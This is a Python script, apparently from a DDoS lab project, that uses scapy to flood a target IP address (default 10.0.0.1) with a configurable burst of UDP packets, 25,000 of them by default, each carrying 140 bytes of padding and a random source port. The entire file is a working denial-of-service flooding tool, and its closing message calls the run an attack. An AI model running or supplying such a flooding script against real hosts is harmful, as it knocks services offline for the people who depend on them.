#!/home/deep/files/arf_ddos/venv/bin/python
import argparse
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning, module="scapy")

from scapy.all import IP, UDP, Raw, send
from random import randint

DEFAULT_TARGET = '10.0.0.1'


def main():
    parser = argparse.ArgumentParser(description='Send a high-rate UDP burst.')
    parser.add_argument('target', nargs='?', default=DEFAULT_TARGET)
    parser.add_argument('--count', type=int, default=25000)
    parser.add_argument('--burst', type=int, default=500)
    parser.add_argument('--pause', type=float, default=0.0)
    parser.add_argument('--port', type=int, default=33434)
    args = parser.parse_args()

    if args.count < 1 or args.burst < 1 or args.pause < 0:
        parser.error('count and burst must be positive; pause cannot be negative')

    print(f'[UDP] sending {args.count} packets to {args.target}:{args.port}', flush=True)
    sent = 0
    while sent < args.count:
        batch_size = min(args.burst, args.count - sent)
        packets = [
            IP(dst=args.target)
            / UDP(dport=args.port, sport=randint(1024, 65535))
            / Raw(load=b'X' * 140)
            for _ in range(batch_size)
        ]
        send(packets, verbose=0)
        sent += batch_size
        if args.pause and sent < args.count:
            import time
            time.sleep(args.pause)
    print('[UDP] attack burst complete', flush=True)


if __name__ == '__main__':
    main()
